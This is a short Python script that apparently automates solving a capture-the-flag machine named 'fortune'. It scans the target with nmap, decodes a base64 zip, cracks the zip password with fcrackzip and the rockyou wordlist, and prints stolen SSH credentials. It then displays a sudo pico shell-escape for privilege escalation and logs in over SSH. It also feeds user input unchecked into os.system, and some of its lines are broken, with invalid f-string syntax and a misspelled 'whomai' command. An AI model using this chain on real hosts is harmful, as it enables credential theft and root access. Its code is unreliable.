#!/usr/bin/python

import os
class root:
    OKGREEN = '\033[92m'
    END = '\033[0m'

ip = input("Enter Your fortune IP: ")
os.system(f'nmap -sV -sC {ip}')

ba64 = input("Enter The base64 code showing in nmap scan(remove spaces from the code): ")
os.system(f'echo {ba64} | base64 -d > decode.zip;fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decode.zip;unzip decode.zip')
os.system('clear')
print(f"{.OKGREEN}SSH LOGIN PASSWORD FOUND!{.END}")
os.system('cat creds.txt')

print("--------------------------------")

print('''
    privilege escalation
|------------------------|
|  sudo pico             |
|  ^R^X                  |
|  reset; sh 1>&0 2>&0   |
--------------------------''')

os.system(f'ssh fortune@{ip}')
os.system('whomai')



